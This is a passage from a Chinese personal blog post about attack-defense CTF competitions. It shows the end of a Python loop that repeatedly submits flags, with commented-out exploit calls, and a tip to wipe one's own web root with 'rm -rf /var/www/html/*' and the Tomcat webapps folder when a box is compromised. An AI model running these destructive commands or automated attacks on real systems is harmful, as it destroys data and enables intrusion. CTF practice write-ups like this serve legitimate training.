        <span class="token comment"># elif isinstance(log_exp(attack_url), str):</span>
        <span class="token comment">#     submit_flag(log_exp(attack_url))</span>
        <span class="token comment"># elif isinstance(unserialize_exp(attack_url), str):</span>
        <span class="token comment">#     submit_flag(unserialize_exp(attack_url))</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************第 "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span> <span class="token operator">+</span>
          <span class="token string">" 次flag提交结束**************************"</span><span class="token punctuation">)</span>
    count <span class="token operator">+=</span> <span class="token number">1</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">420</span><span class="token punctuation">)</span>  <span class="token comment"># 攻击间隔</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="对靶机武装666号——删站（"><a href="#对靶机武装666号——删站（" class="headerlink" title="对靶机武装666号——删站（"></a>对靶机武装666号——删站（</h2><p>如果自己的靶机是按被打次数掉分的，那么在被打烂又不会修的情况下，可以选择直接删库跑路，降低损失</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/www/html/*
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /opt/tomcat/webapps/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h1 id="通防"><a href="#通防" class="headerlink" title="通防"></a>通防</h1><p>开了？</p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>